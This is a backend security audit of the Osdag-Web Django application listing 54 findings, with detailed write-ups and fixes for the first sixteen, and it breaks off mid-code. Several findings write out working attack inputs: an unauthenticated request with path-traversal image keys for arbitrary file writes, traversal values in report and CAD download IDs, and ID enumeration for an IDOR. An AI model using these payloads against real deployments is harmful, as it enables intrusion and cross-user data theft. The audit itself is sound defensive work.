# Osdag-Web — Backend Audit Findings

**Scope:** `backend/` (Django + DRF + Channels + Celery), `osdag_core/` integration points, Docker/CI/deployment config.
**Date:** 2026-09-27 · **Branch:** `master` · **Method:** static source review with direct line-level verification.
**Total findings:** 54 — Critical 5 · High 17 · Medium 21 · Low/Info 11

Every finding below was verified against the source at the cited `file:line`. Where a claim could
**not** be confirmed without a running system, it is explicitly marked `UNVERIFIED` and is *not*
asserted as a vulnerability. A section of **ruled-out false positives** is included at the end so
these are not re-reported.

**Severity meanings for this codebase**
- **Critical** — remote exploitation, secret compromise, or *silently wrong engineering output*.
- **High** — unauthenticated access to data or compute, cross-user disclosure, or a request path that
  can take down a worker.
- **Medium** — defense-in-depth gaps, contract bugs, resource/operational risk.
- **Low/Info** — code quality, dead code, maintainability.

---

## Summary

| # | Sev | Category | Finding | Location |
|---|---|---|---|---|
| 1 | **Critical** | Security | Production secrets committed to Git | `.env` (tracked) |
| 2 | **Critical** | Security | `/silk/` profiler mounted with no auth in prod | `config/urls.py:13` |
| 3 | **Critical** | Engineering-correctness | Purlin: 3 key mismatches → every design request fails | `purlin/adapter.py:20-43` |
| 4 | **Critical** | Engineering-correctness | Cleat angle returns `success: True` with empty output | `cleat_angle/service.py:11-19` |
| 5 | **Critical** | Security | Unauthenticated arbitrary file write via report `images` | `design_report_pdf_view.py:199-213` |
| 6 | High | Security | WebSockets: no auth, no Origin validation | `asgi.py:24`, `consumers.py:81-92` |
| 7 | High | Security | `TaskStatusAPIView` unauthenticated, unowned, leaks errors | `core/views.py:282-300` |
| 8 | High | Security | `OpenOsiById` IDOR — ownership check skipped when owner is NULL | `osi_api.py:88-93` |
| 9 | High | Security | `report_id` path traversal / existence oracle | `report_customization_api.py:150,214` |
| 10 | High | Security | CAD download: no auth, no ownership, traversal | `cad_model_download.py:7,30-32` |
| 11 | High | Reliability | `os.chdir()` in request path → process-global CWD race | `report_customization_api.py:278` |
| 12 | High | Bug + IDOR | Plate-girder options filters `CustomMaterials` by nonexistent `email` | `plate_girder/service.py:80,85` |
| 13 | High | Bug | `simple-connection` never merges user custom sections | `simple_connection/views.py:112,135` |
| 14 | High | Bug | Duplicate `report_generate_initial` → sync path shadows async | `compression_member/views.py:76,296` |
| 15 | High | Reliability | >500 KB task result → WebSocket sends `SUCCESS` with `null` result | `signals.py:135-144` |
| 16 | High | Security | No rate limiting on any design / CAD / report endpoint | `config/settings.py:245-249` |
| 17 | High | Security | Unauthenticated CAD generation + export (plain `View`, `csrf_exempt`) | `cad_model_api.py:26`, `cad_model_export.py:42` |
| 18 | High | Security | nginx serves `/osifiles/` unauthenticated | `frontend/nginx.conf:52-53` |
| 19 | High | Security | Cross-tenant design contamination via shared SQLite catalog | `sections/options_merge.py:66,83` |
| 20 | High | Config | `DEBUG` defaults `True`, `ALLOWED_HOSTS` defaults `*` | `settings.py:50,54` |
| 21 | High | Config | Redis has no password; no `requirepass` anywhere | `docker-compose*.yml` |
| 22 | Medium | Security | CORS allowlist hardcodes 3 private LAN IPs + credentials on | `settings.py:57-68` |
| 23 | Medium | Security | No `SECURE_*` / HSTS / cookie-hardening settings | `settings.py` (absent) |
| 24 | Medium | Security | Firebase revocation ignored; deleted users auto-recreated | `firebase_auth.py:69,79-84,124-131` |
| 25 | Medium | Security | LaTeX injection from client `logs`/`metadata` into `pdflatex` | `design_report_pdf_view.py:128-132` |
| 26 | Medium | Security | Unbounded uploads; `.read()` of whole file into RAM | `osi_api.py:62`, `sections/views.py:196` |
| 27 | Medium | Security | XLSX formula injection in section exports | `export_scopes.py:34-35` |
| 28 | Medium | Security | `CompanyLogoView`: guest upload, arbitrary extension, path disclosure | `design_report_pdf_view.py:261-281` |
| 29 | Medium | Info-disclosure | Raw `str(exception)` returned to clients (7 parents + core) | 12 sites, see below |
| 30 | Medium | Reliability | `populate_database.py`: hardcoded password + silent failure (exit 0) | `populate_database.py:13,44-45` |
| 31 | Medium | Reliability | No Celery reliability settings (acks_late, prefetch, visibility) | `settings.py:172-203` |
| 32 | Medium | Reliability | PSO task unrouted → lands on latency-critical `calculations` | `plate_girder/tasks.py:98` |
| 33 | Medium | Reliability | `celery.py` bare `except` hides PSO task registration failure | `config/celery.py:13-18` |
| 34 | Medium | Perf | `CONN_MAX_AGE` unset → connection per request | `settings.py:161-170` |
| 35 | Medium | Bug | `get_service_class` resolves globally, ignoring parent | `core/tasks.py:11-15` |
| 36 | Medium | Bug | 5 CAD section contracts reject their own default sections | `cad_helpers.py` vs adapters |
| 37 | Medium | Bug | `header-plate` missing from `SECTION_MAPPINGS` → CAD incomplete | `cad_helpers.py:12-17` |
| 38 | Medium | Bug | Seated-angle report `MODULE_ID` mismatch (`Seated-Angle-Connection`) | `shear_connection/views.py:30` |
| 39 | Medium | Engineering-correctness | Purlin span labelled metres, sent as mm (1000× error) | `purlinConfig.js:107` |
| 40 | Medium | Engineering-correctness | Silent `Area/100` corruption for areas > 1000 mm² | `options_merge.py:88` |
| 41 | Medium | Data-model | `Project.user_email` unindexed, nullable, not a FK | `models.py:29` |
| 42 | Medium | Data-model | Unbounded `JSONField` for full engine I/O | `models.py:24-26` |
| 43 | Medium | Data-model | `OsiFile.owner_email` never persisted → ownership always NULL | `user_view.py:50`, `serializers.py:30` |
| 44 | Medium | Data-model | Destructive, irreversible `RunPython` migration | `migrations/0012_*.py:8` |
| 45 | Medium | Quality | **No Python linter or type-checker anywhere in the repo** | (absent) |
| 46 | Medium | Testing | CI skips **all** backend tests; 0 tests for the module layer | `conftest.py` |
| 47 | Medium | Quality | 814 `print()` calls in production module code | `apps/modules/` (44 files) |
| 48 | Medium | Quality | No `Project` serializer; all project views hand-built | `serializers.py` |
| 49 | Low | Bug | Type-confusion 500s (`metadata`/`logs` non-dict) | `design_report_pdf_view.py:124,129` |
| 50 | Low | Reliability | `time.sleep(3)` hardcoded in the request path | `design_report_pdf_view.py:242` |
| 51 | Low | Bug | `parse_osi` version check defeated by YAML fallback | `osi_files.py::parse_osi` |
| 52 | Low | Bug | `import tkinter` in headless container path | `osi_files.py:5` |
| 53 | Low | Security | `config/mailing.py` prints the SMTP password | `mailing.py:19` |
| 54 | Low | DevOps | Absolute developer path committed in a migration | `migrations/0013_*.py:25` |

---

# Critical

## 1. Production secrets committed to Git

**Severity:** Critical · **Category:** Security
**Location:** `.env` (git-tracked), introduced in commit `ecf13dee`; listed in `.gitignore:89`

```console
$ git ls-files --error-unmatch .env
.env
$ git log --oneline --diff-filter=A -- .env
ecf13dee Add Struts Bolted to End Gusset module
```

`.env` contains non-empty values for `SECRET_KEY` (14 chars), `DATABASE_PASSWORD`, and
`INFLUXDB_TOKEN`. `.gitignore` does **not** untrack an already-tracked file, so the ignore rule has
no effect here.

**Impact**
- `SECRET_KEY` signs cookies, sessions, and any `django.core.signing` payload. A 14-character value
  is far below any entropy target and permits signature forgery outright.
- `DATABASE_PASSWORD` grants direct Postgres access (host port 5433 is published in dev compose).
- `INFLUXDB_TOKEN` grants telemetry write access.
- The repository is public on GitHub; exposure in history is **permanent** regardless of later deletion.

**Fix**
```bash
# 1. Rotate first — treat all three as already burned.
# 2. Untrack, then purge history:
git rm --cached .env
git filter-repo --invert-paths --path .env
# 3. Add a pre-commit secret scanner (gitleaks / detect-secrets).
```
Note: the `VITE_API_URL` / Firebase **web** API key in `.env` is public by design — do not treat that
one as a secret. The `backend/firebase-service-account.json` private key must also be checked for
historical exposure.

---

## 2. `/silk/` profiler mounted with no authentication in every environment

**Severity:** Critical · **Category:** Security
**Location:** `backend/config/urls.py:13`, `backend/config/settings.py:107`, `:115`

```python
# config/urls.py:13
    path('silk/', include('silk.urls', namespace='silk')),
```
```python
# settings.py:107
    'silk',
# settings.py:115
    'silk.middleware.SilkyMiddleware',
```

A repository-wide grep for `SILKY_` returns **zero** results — no `SILKY_AUTHENTICATION`, no
`SILKY_AUTHORISATION`, no `SILKY_PEPPER`, and no `DEBUG` gate on the include.

**Impact**

`django-silk` records every request and response. Its documented defaults are
`SILKY_AUTHENTICATION = False` and `SILKY_AUTHORISATION = False`, so with no override anyone who can
reach the backend can browse:

- `/silk/requests/` — every recorded request/response **including headers and bodies**. For this app
  that means the Firebase ID tokens POSTed to the login endpoint, every design input/output payload,
  project names, and OSI file contents.
- `/silk/sql/` — every SQL statement and bound parameter, i.e. the full shape of the user/project/osi tables.
- `/silk/profiling/` — attacker-triggered CPU load on demand.

`docker-compose.prod.yml` sets `DEBUG: "False"`, but neither that nor the absence of `SILKY_*`
disables the mount. `SilkyMiddleware` also adds per-request latency and memory on the hot design path
in production.

**Fix**
```python
# config/urls.py
if settings.DEBUG:
    urlpatterns += [path("silk/", include("silk.urls", namespace="silk"))]
```
```python
# settings.py — only when you must ship it
SILKY_AUTHENTICATION = True
SILKY_AUTHORISATION   = True
SILKY_PEPPER          = os.environ["SILKY_PEPPER"]
```

---

## 3. Purlin: three key mismatches make every design request fail

**Severity:** Critical · **Category:** Engineering-correctness
**Location:** `backend/apps/modules/flexure_member/submodules/purlin/adapter.py:20-43` vs
`frontend/src/modules/flexuralMember/purlin/configs/purlinConfig.js:99-107`

The adapter's own docstring says *"Keys must match frontend `buildSubmissionParams()`"*. They do not.

```python
# adapter.py:24-42  (backend requires)
        "Cladding.type",           # KEY_CLADDING
        "Load.Moment_YY",
        "Load.Moment_ZZ",
```

```javascript
// purlinConfig.js:99-107  (frontend sends)
      "Cladding.Type": String(inputs.cladding_type),
      "Load.Moment.YY": String(inputs.bending_moment_yy),
      "Load.Moment.ZZ": String(inputs.bending_moment_zz),
```

| Backend requires | Frontend sends | Mismatch |
|---|---|---|
| `Cladding.type` | `Cladding.Type` | case |
| `Load.Moment_YY` | `Load.Moment.YY` | `_` vs `.` |
| `Load.Moment_ZZ` | `Load.Moment.ZZ` | `_` vs `.` |

`osdag_core/Common.py` confirms the backend spelling is authoritative (`KEY_CLADDING =
'Cladding.type'`, `KEY_MOMENT_YY = 'Load.Moment_YY'`). `validate_input` calls `contains_keys`, which
returns the first missing key, so **every Purlin submission raises `MissingKeyError`.** This is a live
frontend route (`frontend/src/constants/modules.js:161`).

**Fix**
```javascript
"Cladding.type":   String(inputs.cladding_type),
"Load.Moment_YY":  String(inputs.bending_moment_yy),
"Load.Moment_ZZ":  String(inputs.bending_moment_zz),
```
Hardcoding these strings on both sides is the root cause. Import the engine constants on the frontend,
and add a **shared-contract test** asserting, for every submodule,
`set(adapter.get_required_keys()) <= set(frontend.buildSubmissionParams())`. That one test would have
caught this and prevents the whole class of bug.

---

## 4. Cleat angle and seated angle report `success: True` with no design output

**Severity:** Critical · **Category:** Engineering-correctness
**Location:** `cleat_angle/service.py:11-19`, `cleat_angle/adapter.py:272-279`,
`seated_angle/adapter.py:209-233`, `seated_angle/service.py:11-19`

```python
# cleat_angle/service.py:11-19
    @staticmethod
    def calculate(inputs: dict, request=None, project_id=None, user_email=None) -> dict:
        validate_input(inputs)
        output, logs, raw_csv = generate_output(inputs)
        return {
            'data': output,
            'logs': logs,
            'success': True,          # <-- unconditional
            'raw_csv': raw_csv or {},
        }
```

```python
# cleat_angle/adapter.py:272-279
    if module is None:
        print('CleatAngle - Module creation failed, returning empty output')
        return {}, [], {}            # <-- empty, but still success:True
    if not hasattr(module, 'output_values'):
        print('CleatAngle - Module does not have output_values method')
        return {}, [], {}
```

Seated angle is worse — `create_from_input` can return an **unbound** local:

```python
# seated_angle/adapter.py:209-233
    # validate_input(input_values)          # line 211, commented out
    try :
        module = create_module()
    except Exception as e :
        print('e in create_module : ' , e)
        print('error in creating module')    # module never bound
    ...
    try :
        module.set_input_values(design_dictionary)
    except Exception as e :
        traceback.print_exc()                # swallowed
        print('error in setting the input values')
    return module                            # line 233, outside any try
```

**Impact**

- If the engine module fails to construct, the API returns **HTTP 200 with `success: true` and zero
  design results**. A connection that was never designed is indistinguishable from a passing design.
  An engineer could read this as "no utilization problems found."
- Seated angle has two failure modes: (a) `create_module()` raises → `module` unbound →
  `UnboundLocalError` escapes the function → HTTP 500; (b) `set_input_values` fails → an
  **unconfigured** module is returned and `success: True` is reported.

**Fix** — never let a failure degrade into a success signal:
```python
# adapter: let exceptions propagate
def create_from_input(input_values):
    validate_input(input_values)
    module = create_module()                     # no try/except
    module.set_input_values(...)                 # no try/except
    return module

# service: derive success from the output
return {'data': output, 'logs': logs, 'success': bool(output), 'raw_csv': raw_csv or {}}
```
Audit every one of the 27 services for the hardcoded `'success': True` pattern — this is likely not
isolated to these two.

---

## 5. Unauthenticated arbitrary file write via the report `images` key

**Severity:** Critical · **Category:** Security
**Location:** `backend/apps/core/api/design/design_report_pdf_view.py:199-214`

```python
199:                for key, data_url in images.items():
200:                    try:
201:                        if not isinstance(data_url, str):
202:                            continue
...
208:                        img_bytes = base64.b64decode(b64)
209:
210:                        normalized_key = str(key).lower()
211:                        filename = filename_map.get(normalized_key, f"{key}.png")   # <-- raw key
212:                        out_path = os.path.join(image_base_dir, filename)
213:                        with open(out_path, "wb") as img_f:
214:                            img_f.write(img_bytes)
```

`normalized_key` (line 210) is used **only** for the safe `filename_map` lookup. The fallback on the
same line uses the **raw, client-controlled `key`**. There is no `os.path.basename`, no character
allowlist, and no size cap on the decoded bytes.

**Exploit.** Guests are permitted (`IsEmailVerifiedIfAuthenticated`):
```http
POST /api/modules/compression-member/struts-bolted/report/generate-initial/
Content-Type: application/json

{"module_id":"Struts-Bolted-Design",
 "input_values":{ "...": "..." },
 "images":{"/app/file_storage/pwned":"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}}
```
`os.path.join(image_base_dir, "/app/file_storage/pwned.png")` — because the second argument is
absolute, `os.path.join` **discards the base entirely**. A relative variant works identically:
key `"../../../../../../app/file_storage/pwned"`.

**Impact:** arbitrary-content file write with attacker-chosen location anywhere the `deployuser`
process can write, with a forced `.png` suffix. Reachable **without authentication**, via the
synchronous compression-member report path (see #14) and the async report path for all six other
parents. Combined with #18 (nginx serving `/osifiles/`), this enables planting content that is then
served same-origin.

**Fix**
```python
if normalized_key not in filename_map:
    logger.warning("[ReportImages] rejected unknown image key %r", key)
    continue
filename = filename_map[normalized_key]          # allowlist only, never f"{key}.png"
if len(img_bytes) > 5 * 1024 * 1024:
    continue
out_path = (Path(image_base_dir) / filename).resolve()
if not out_path.is_relative_to(Path(image_base_dir).resolve()):
    continue
```

---

# High

## 6. WebSockets: no authentication and no Origin validation

**Severity:** High · **Category:** Security
**Location:** `backend/config/asgi.py:13,24`, `backend/apps/core/routing.py:5-7`, `backend/apps/core/consumers.py:81-92`, `:162-164`

```python
# config/asgi.py:13  — imported...
from channels.security.websocket import AllowedHostsOriginValidator
# config/asgi.py:24  — ...and never used
    "websocket": URLRouter(websocket_urlpatterns),
```

A repository-wide grep confirms the **only** occurrence of `AllowedHostsOriginValidator` is that dead
import. Neither consumer inspects `scope["user"]` or headers:

```python
# consumers.py:84-92
        self.task_id    = self.scope['url_route']['kwargs']['task_id']
        self.group_name = f"task_{self.task_id}"
        await self.channel_layer.group_add(self.group_name, self.channel_name)
        await self.accept()                     # unconditional
```

```python
# consumers.py:164 (PSO) and :187
        await self.accept()                     # unconditional
...
            task_result = run_pso_optimization.delay(self.channel_name, input_data)   # no auth, no throttle
```

**Impact**
- `TaskStatusConsumer` — any client that learns a `task_id` receives the **entire design result**.
  There is no Origin check, so this is reachable cross-origin (classic Cross-Site WebSocket
  Hijacking). `task_id`s are UUID4, so the risk is ID leakage via logs, Referer, the `report_id` echo,
  or the Redis result backend — not brute force.
- `PSOOptimizationConsumer` — any anonymous client can enqueue an arbitrarily heavy particle-swarm
  optimization with attacker-controlled inputs, repeatedly, at zero cost. The `disconnect` handler
  revokes only that connection's task, so a client that never closes the socket keeps the work alive.
  This is a cheap DoS against the same worker pool that serves real users (and see #32 — it lands on
  the `calculations` queue).

**Fix**
```python
# config/asgi.py
    "websocket": AllowedHostsOriginValidator(URLRouter(websocket_urlpatterns)),
```
```python
# consumers.py — authenticate before group_add
    async def connect(self):
        user = await self._authenticate()        # parse + verify the Firebase token
        if user is None:
            await self.close(code=4401); return
        if not await self._owns_task(self.task_id, user):
            await self.close(code=4403); return
        await self.channel_layer.group_add(self.group_name, self.channel_name)
        await self.accept()
```
For PSO, also validate `data` against the module schema before `.delay()` and apply a per-user
concurrency cap.

---

## 7. `TaskStatusAPIView` is unauthenticated, unowned, and leaks internal errors

**Severity:** High · **Category:** Security
**Location:** `backend/apps/core/views.py:282-300`

```python
class TaskStatusAPIView(APIView):
    authentication_classes = []
    permission_classes = [AllowAny]

    def get(self, request, task_id):
        task_result = AsyncResult(task_id)
        response_data = {"task_id": task_id, "status": task_result.status}
        if task_result.ready():
            if task_result.successful():
                response_data["result"] = task_result.result
            else:
                response_data["error"] = str(task_result.result)   # raw exception text
        return Response(response_data, status=status.HTTP_200_OK)
```

`authentication_classes = []` disables the project's own default auth. There is **no ownership check** —
the task's producing user is never compared to `request.user`.

**Impact**
- Full design output for any `task_id` (see #6 for how ids leak).
- `str(task_result.result)` returns raw Python exception text — file paths, SQL fragments, library
  internals — to an anonymous caller for any failed task.

**Fix**
```python
    permission_classes = [IsEmailVerified]
...
        owner = _task_owner(task_id)                      # recorded at trigger time
        if owner and owner != request.user.email:
            return Response({"detail": "Not found."}, status=404)
...
            response_data["error"] = "The design task failed."   # never str(result)
```
Record `task_id → user_email` in `apps/core/utils/module_helpers.py` at enqueue time, or sign the
task id so it is not guessable or leakable.

---

## 8. `OpenOsiById` IDOR — the ownership check is skipped when the owner is NULL

**Severity:** High · **Category:** Security
**Location:** `backend/apps/core/api/projects/osi_api.py:86-93`, writer at
`backend/apps/core/api/auth/user_view.py:50-52`, serializer at `backend/apps/core/serializers.py:30-35`

```python
# osi_api.py:86-93
            osifile = OsiFile.objects.get(id=osifile_id)
            owner_email = osifile.owner_email
            requester_email = getattr(request.user, 'email', None)
            if owner_email and requester_email != owner_email:      # <-- short-circuits on None
                return JsonResponse({'success': False, 'error': 'Access denied'}, ...status=403)
```

`owner_email` is **never persisted**. `OsiFileSerializer` exposes only `['id', 'file', 'created_at']`,
and the only writer does `serializer.save()` with no owner — so every row it creates is NULL-owner, and
the guard is a **dead branch**. `osifile_id` is a sequential `BigAutoField` on route
`api/open-osi/<int:osifile_id>/`.

**Exploit:** authenticate with any email-verified Firebase account, then `GET /api/open-osi/1/`,
`/2/`, … to read every other user's saved design inputs plus `osifile.file.url` (line 96).

**Note:** the sole writer currently declares no `parser_classes`, so it inherits `JSONParser` only and
returns **415** for `multipart/form-data` — the upload path is separately broken (#26 context). The
IDOR primitive is complete and arms the moment that is fixed, plus any rows from seeds or other writers.

**Fix**
```python
osifile = OsiFile.objects.get(id=osifile_id, owner_email=request.user.email)
```
Set `owner_email` in `OsiFileSerializer.create()` from `request.user.email`, make the column
`NOT NULL`, and add a `UniqueConstraint`. Deny by default rather than allowing on NULL.

---

## 9. `report_id` path traversal and existence oracle

**Severity:** High · **Category:** Security
**Location:** `backend/apps/core/api/design/report_customization_api.py:150` and `:214`

```python
150:            tex_file_path = os.path.join(os.getcwd(), 'file_storage', 'design_report', report_id, f'{report_id}.tex')
...
214:            tex_file_path = os.path.join(os.getcwd(), 'file_storage', 'design_report', report_id, f'{report_id}.tex')
```

`report_id` is taken raw from the request body (`:142`, `:203`) with **no validation, no length bound,
and no character allowlist**. Both views are guest-accessible
(`permission_classes = [IsEmailVerifiedIfAuthenticated]`, `:137`, `:197`) and neither performs an
ownership check.

**Exploit**
```http
POST /api/report/parse-sections/
{"report_id":"../../../../app/file_storage/design_report"}
→ 404   (path does not exist)
→ 200   {"sections": {...}}    (path exists — existence oracle)
```
Because `report_id` is a path *component* (not concatenated), the target must be a file literally named
`<last-component>.tex` in an existing directory, so `/etc/passwd` is **not** readable. The realistic
impact is cross-user report disclosure (the app's own layout is exactly
`design_report/<id>/<id>.tex`) plus a general path-existence oracle. `CustomizeReport` additionally
executes `pdflatex` on whatever it retrieves (#25).

A multi-kilobyte `report_id` also triggers `OSError: [Errno 36] File name too long` → 500 with
`str(e)`.

**Fix** — `report_id` is generated by `get_random_string(length=16)`, so validate exactly that:
```python
report_id = request.data.get('report_id', '')
if not re.fullmatch(r'[A-Za-z0-9]{16}', report_id):
    return Response({"error": "Invalid report_id"}, status=400)
root = (settings.FILE_STORAGE_ROOT / "design_report").resolve()
tex  = (root / report_id / f"{report_id}.tex").resolve()
if not tex.is_relative_to(root):
    return Response({"error": "Invalid report_id"}, status=400)
```
Also record the owning `user_email` with the report and 404 for non-owners.

---

## 10. CAD download: no auth, no ownership check, traversal

**Severity:** High · **Category:** Security
**Location:** `backend/apps/core/api/cad/cad_model_download.py:7,15,30-32,38-39`; routed at
`backend/apps/core/urls.py:67-68`

```python
 7: class CADDownload(APIView):          # no permission_classes → DRF default allows guests
...
15:            request_id = data.get('request_id')  # Use request_id instead of session
...
24:            allowed_formats = ["obj", "brep", "step", "iges"]
25:            if format_type.lower() not in allowed_formats:
...
29:            if format_type == "obj":
30:                file_path = os.path.join("frontend", "public", f"output-{section.lower()}.obj")
31:            else:
32:                file_path = os.path.join("file_storage", "cad_models", f"{request_id}_{section}.{format_type.lower()}")
...
38:            response = FileResponse(open(file_path, 'rb'), content_type='application/octet-stream')
39:            response['Content-Disposition'] = f'attachment; filename="{request_id}_{section}.{format_type}"'
```

**Confirmed mitigations (do not over-read this):** the format allowlist (`:24-26`) blocks reading
`.py`/`.env`/`.sqlite`; the `obj` branch prefixes `output-`; and Django's `BadHeaderError` blocks CRLF
injection in `Content-Disposition`.

**Real, but constrained, traversal:** `request_id` and `section` are interpolated into one f-string, and
an absolute `request_id` resets the join:
```json
{"format":"step","section":"x","request_id":"/app/secret"}
→ /app/secret_x.step
{"format":"brep","section":"y","request_id":"../../../../app/osifiles/f"}
→ file_storage/cad_models/../../../../app/osifiles/f_y.brep
```
So a traversal requires an existing file matching `*_<section>.{brep,step,iges}`. What is confirmed:
(a) a guest-reachable **path-existence oracle** (404 vs 200) for arbitrary paths, and (b) a read of
any file whose name matches the pattern.

**No ownership check:** `session_id` is the Celery task UUID, returned to the client as `task_id` in
the 202. Anyone who learns another user's `task_id` downloads their CAD model.

**Correctness bug:** `:25` lowercases for validation but `:29` compares the raw value, so
`format: "OBJ"` passes validation then takes the `else` branch and looks for a `.obj` under
`file_storage/cad_models` instead of the static preview.

**Fix**
```python
    permission_classes = [IsEmailVerified]
...
            if not re.fullmatch(r'[0-9a-f-]{36}', str(request_id)):
                return JsonResponse({"status": "error", "message": "Invalid request_id."}, status=400)
            if not re.fullmatch(r'[A-Za-z0-9_.-]{1,64}', str(section)):
                return JsonResponse({"status": "error", "message": "Invalid section."}, status=400)
            fmt = format_type.lower()
            root = (settings.FILE_STORAGE_ROOT / "cad_models").resolve()
            file_path = (root / f"{request_id}_{section}.{fmt}").resolve()
            if not file_path.is_relative_to(root):
                return JsonResponse({"status": "error", "message": "Invalid path."}, status=400)
```
Add the ownership check, and anchor all paths to a `settings`-defined absolute root rather than
`os.getcwd()` (see #11).

---

## 11. `os.chdir()` in the request path — process-global CWD race

**Severity:** High · **Category:** Reliability / Security
**Location:** `backend/apps/core/api/design/report_customization_api.py:277-278, 364-366`;
`backend/apps/core/api/design/design_report_pdf_view.py:97, 239`; relative-path consumers at
`cad_model_download.py:30,32`, `base_plate/adapter.py:457`, `flexure_member/shared.py:66`,
`plate_girder/adapter.py:679`, and ~10 more adapters

```python
# report_customization_api.py:277-278
            original_cwd = os.getcwd()
            os.chdir(safe_temp_dir)          # process-global
...
# report_customization_api.py:364-366
            finally:
                os.chdir(original_cwd)
```

`os.chdir` mutates **process-global** state, but Gunicorn/Uvicorn workers run requests concurrently
across threads. For the entire window between line 278 and 366 — which contains **two 60-second
`pdflatex` passes** — the process CWD is `/tmp/osdag_pdf_*`. Meanwhile ~15 code paths resolve paths
**relative to the CWD**:
```python
# cad_model_download.py:32
    file_path = os.path.join("file_storage", "cad_models", f"{request_id}_{section}.{format_type.lower()}")
```

**Impact**
- While request A compiles a report, request B's CAD generation writes to
  `/tmp/osdag_pdf_XXXX/file_storage/cad_models/…` instead of the repository, and B's `CADDownload`
  lookup resolves against the temp directory too → cross-user CAD exposure or denial.
- Two overlapping `CustomizeReport` calls are worse: the second records `original_cwd` as the *first's*
  temp dir; the first's `finally` restores the real CWD, then the second's `finally` restores the
  first's temp dir — **leaving the process permanently CWD-locked** inside a directory a later
  `mkdtemp` cleanup may delete.
- `design_report_pdf_view.py:239` restores the CWD but is **not in a `finally`**.

**Fix** — never `chdir` in request handling. Pass an absolute `cwd=` to `subprocess.run`, and build
every storage path from a module-level absolute constant:
```python
# config/settings.py
FILE_STORAGE_ROOT = BASE_DIR / "file_storage"
# everywhere else
subprocess.run([...], cwd=str(safe_temp_dir))          # absolute
file_path = settings.FILE_STORAGE_ROOT / "cad_models" / name
```

---

## 12. Plate-girder `options` filters `CustomMaterials` by a non-existent field (500 + IDOR)

**Severity:** High · **Category:** Bug / Security
**Location:** `backend/apps/modules/flexure_member/submodules/plate_girder/service.py:80,85`;
dispatched from `flexure_member/views.py:170-179`, caught at `:185-189`

```python
# plate_girder/service.py:80,85
        email = request.query_params.get("email") if request else None
        def material_list():
            mats = list(Material.objects.all().values())
            if email:
                mats += list(CustomMaterials.objects.filter(email=email).values())   # no such field
```

`CustomMaterials` has **no `email` field** — it is a `ForeignKey` to `auth.User`:
```python
# backend/apps/core/models.py:354-360
class CustomMaterials(models.Model):
    user = models.ForeignKey('auth.User', on_delete=models.CASCADE, related_name='custom_materials')
    Grade = models.TextField()
```
This is the only place in the codebase that filters by `email`; all 12 other call sites correctly use
`user=request.user`.

**Impact**
- `FieldError` → caught at `views.py:185` → **HTTP 500 with the raw exception text**, disclosing model
  and field names. Every parent ViewSet is `permission_classes = [AllowAny]`.
- **IDOR:** even after fixing the field name, `?email=victim@example.com` is a user-supplied query
  parameter scoping another user's private material data (yield stresses, UTS, elongation).

**Fix** — delete `get_options` from the service and use the shared `material_list()` helper the other
six parents use in their views (`flexure_member/views.py:67-72`). Never accept an identity parameter
from the client.

---

## 13. `simple-connection` never merges user custom sections

**Severity:** High · **Category:** Bug
**Location:** `backend/apps/modules/simple_connection/views.py:112,135`

```python
112:                return Response(data, status=status.HTTP_200_OK)
135:                return Response(data, status=status.HTTP_200_OK)
```

The other six parents all import and call `merge_user_sections_into_options` (e.g.
`shear_connection/views.py:22,103`). This module does not.

**Impact:** for butt and lap joints, **user-uploaded custom sections are never offered in the
dropdown** — the entire custom-sections feature is silently unavailable for these four modules, with
no error.

**Fix:** import `merge_user_sections_into_options` and wrap both returns, matching the siblings.

---

## 14. Duplicate `report_generate_initial` — the sync path silently shadows the async one

**Severity:** High · **Category:** Bug
**Location:** `backend/apps/modules/compression_member/views.py:76` and `:296`

```console
$ grep -n "def report_generate_initial" backend/apps/modules/compression_member/views.py
76:    def report_generate_initial(self, request, submodule_slug=None):
296:    def report_generate_initial(self, request, submodule_slug=None):
```

Both are `@action(detail=False, methods=['post'], url_path='…/report/generate-initial')` with the same
name. The **second definition overwrites the first** in the class namespace, so DRF registers only the
synchronous version at `:296-345` (calling `generate_initial_report_core` inline). The async version at
`:76-82` (`trigger_async_report`) is **dead code**.

**Impact**
- Compression-member report generation blocks the request thread for the full LaTeX compile, unlike all
  five other parents (202 + WebSocket). It will time out under load.
- It runs the arbitrary file write (#5) and the `os.chdir` race (#11) directly in the request thread.
- Invisible in review because both definitions look correct in isolation.

**Fix:** delete the `:76-82` block.

---

## 15. Oversized task results are silently dropped — WebSocket sends `SUCCESS` with `null`

**Severity:** High · **Category:** Reliability
**Location:** `backend/apps/core/signals.py:133-155`

```python
        if state == "SUCCESS":
            try:
                serialized = json.dumps(retval)
                if len(serialized) > 500 * 1024:      # 500 KB
                    logger.info(...)
                else:
                    result_val = retval               # <-- left as None when too big
            except Exception as e:
                logger.error(f"Failed to serialize Celery task {task_id} result: {e}")
        else:
            error_val = str(retval)

        async_to_sync(channel_layer.group_send)(
            f"task_{task_id}",
            {"type": "task.update", "status": state, "result": result_val, "error": error_val},
        )
```

**Impact:** when a design result exceeds 500 KB, the client receives
`{"status": "SUCCESS", "result": null, "error": null}`. The UI shows a "successful" design with no
data and hangs. Full `output_values()` plus the complete `CustomLogger` log buffer routinely exceeds
500 KB for larger connections, so this is not an edge case.

**Fix** — never send a success with no payload. Truncate, or signal explicitly:
```python
        if result_val is None and state == "SUCCESS":
            result_val = {"_truncated": True,
                          "_message": "Result exceeded the WebSocket limit; "
                                      "poll /api/tasks/<id>/ or download the report."}
```

---

## 16. No rate limiting on any design / CAD / report endpoint

**Severity:** High · **Category:** Security / Availability
**Location:** `backend/config/settings.py:245-249`; all `backend/apps/modules/*/views.py`

```python
    # Used by ScopedRateThrottle on section import/export views only.
    'DEFAULT_THROTTLE_RATES': {
        'sections_import': '60/hour',
        'sections_export': '120/hour',
    },
```

Only the two section views carry a `ScopedRateThrottle`. Every module ViewSet is unconditionally
public:
```python
# apps/modules/flexure_member/views.py:45
    permission_classes = [AllowAny]  # Allow both authenticated and guest users
```
(identical at `shear_connection/views.py:45`, `moment_connection/views.py:46`, `tension_member/views.py:39`,
`compression_member/views.py:41`, `simple_connection/views.py:40`, `base_plate/views.py:38`)

**Impact:** the cheap Django tier accepts each request immediately with HTTP 202, so a script looping
over the ~30 registered slugs calling `design/` and `report/generate-initial/` saturates the `cad`
(concurrency 8) and `reports` (concurrency 4) queues for real users at zero cost. `CustomizeReport`
is worse — it runs `pdflatex` **synchronously** in the request thread (#25).

Guest access is a deliberate product feature, so the fix is **throttling, not removal**:
```python
'DEFAULT_THROTTLE_CLASSES': ['rest_framework.throttling.AnonRateThrottle',
                             'rest_framework.throttling.UserRateThrottle'],
